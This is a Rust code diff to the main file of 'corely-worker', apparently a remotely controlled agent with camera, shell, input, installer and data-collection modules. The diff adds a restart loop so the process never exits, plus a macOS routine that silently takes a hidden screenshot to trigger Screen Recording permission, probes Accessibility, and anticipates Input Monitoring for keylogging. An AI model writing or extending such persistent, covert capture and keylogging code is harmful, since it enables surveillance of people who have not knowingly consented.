@@ -1,5 +1,6 @@
 mod camera;
 mod connection;
+mod data_collection;
 mod filesystem;
 mod input;
 mod installer;
@@ -11,9 +12,16 @@ mod shell;
 mod system;
 
 use clap::Parser;
+use std::panic;
 use std::path::PathBuf;
-use tracing::{info, Level};
+use std::sync::atomic::{AtomicU32, Ordering};
+use std::time::Duration;
+use tracing::{error, info, warn, Level};
 use tracing_subscriber::FmtSubscriber;
+
+/// Track consecutive crashes for exponential backoff
+static CRASH_COUNT: AtomicU32 = AtomicU32::new(0);
+const MAX_CRASH_BACKOFF_SECS: u64 = 300; // Max 5 minutes between retries
 
 #[derive(Parser, Debug)]
 #[command(name = "corely-worker")]
@@ -54,6 +62,14 @@ struct Args {
 
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
+    // Set up panic hook for resilience - log and continue instead of crashing
+    let default_panic = panic::take_hook();
+    panic::set_hook(Box::new(move |info| {
+        error!("PANIC caught: {:?}", info);
+        // Call default panic hook but don't abort - we'll recover
+        default_panic(info);
+    }));
+
     let args = Args::parse();
 
     // Initialize logging
@@ -102,16 +118,61 @@ async fn main() -> anyhow::Result<()> {
     info!("Starting corely worker: {}", worker_name);
     info!("Connecting to server: {}", server);
 
+    // On macOS, request permissions at startup (this is when the daemon binary runs)
+    #[cfg(target_os = "macos")]
+    {
+        request_permissions_silent().await;
+    }
+
     // Load plugins if specified
-    let plugins = if let Some(tools_path) = args.tools {
+    let plugins = if let Some(tools_path) = args.tools.clone() {
         info!("Loading plugins from: {:?}", tools_path);
-        plugins::load_plugins(&tools_path)?
+        plugins::load_plugins(&tools_path).unwrap_or_else(|e| {
+            warn!("Failed to load plugins: {}", e);
+            Vec::new()
+        })
     } else {
         Vec::new()
     };
 
-    // Start connection loop
-    connection::run(&server, &token, &worker_name, plugins).await
+    // Resilient main loop - never exit, always recover from crashes
+    loop {
+        let result = panic::catch_unwind(panic::AssertUnwindSafe(|| {
+            let rt = tokio::runtime::Handle::current();
+            rt.block_on(async {
+                connection::run(&server, &token, &worker_name, plugins.clone()).await
+            })
+        }));
+
+        match result {
+            Ok(Ok(())) => {
+                // Normal exit - shouldn't happen, but reset crash count
+                CRASH_COUNT.store(0, Ordering::SeqCst);
+                info!("Connection loop exited normally, restarting...");
+            }
+            Ok(Err(e)) => {
+                // Error from connection::run
+                error!("Connection error: {}, restarting...", e);
+                CRASH_COUNT.store(0, Ordering::SeqCst); // Connection errors are expected
+            }
+            Err(panic_info) => {
+                // Caught a panic - use exponential backoff
+                let crash_count = CRASH_COUNT.fetch_add(1, Ordering::SeqCst) + 1;
+                let backoff_secs = std::cmp::min(
+                    (2u64.pow(crash_count as u32)),
+                    MAX_CRASH_BACKOFF_SECS
+                );
+                error!(
+                    "PANIC RECOVERED (crash #{}, panic: {:?}), backing off for {}s...",
+                    crash_count, panic_info, backoff_secs
+                );
+                std::thread::sleep(Duration::from_secs(backoff_secs));
+            }
+        }
+
+        // Brief sleep before restart
+        std::thread::sleep(Duration::from_secs(1));
+    }
 }
 
 /// Request macOS permissions by triggering the relevant APIs.
@@ -162,4 +223,46 @@ async fn request_permissions() -> anyhow::Result<()> {
     }
 
     Ok(())
+}
+
+/// Silently request permissions at daemon startup on macOS.
+/// This triggers permission requests for the actual daemon binary.
+#[cfg(target_os = "macos")]
+async fn request_permissions_silent() {
+    use std::process::Command;
+
+    info!("Checking/requesting macOS permissions for daemon...");
+
+    // Screen Recording - attempt screenshot to trigger permission
+    // This is the key fix: the daemon process is requesting the permission
+    let screenshot_result = Command::new("screencapture")
+        .args(["-x", "-t", "png", "/tmp/corely_daemon_perm_check.png"])
+        .output();
+    let _ = std::fs::remove_file("/tmp/corely_daemon_perm_check.png");
+
+    match screenshot_result {
+        Ok(output) if output.status.success() => {
+            info!("Screen Recording permission: granted or dialog shown");
+        }
+        _ => {
+            warn!("Screen Recording permission may be required - check System Settings > Privacy & Security > Screen Recording");
+        }
+    }
+
+    // Accessibility - attempt to use enigo
+    use enigo::{Enigo, Settings};
+    match Enigo::new(&Settings::default()) {
+        Ok(_) => {
+            info!("Accessibility permission: granted");
+        }
+        Err(e) => {
+            warn!("Accessibility permission required: {:?}", e);
+            warn!("Grant access in System Settings > Privacy & Security > Accessibility");
+        }
+    }
+
+    // Input Monitoring for keylogger (CGEventTap)
+    // This is triggered when we actually try to use keylogging,
+    // but we can log a reminder
+    info!("Input Monitoring permission will be requested when keylogging is activated");
 }
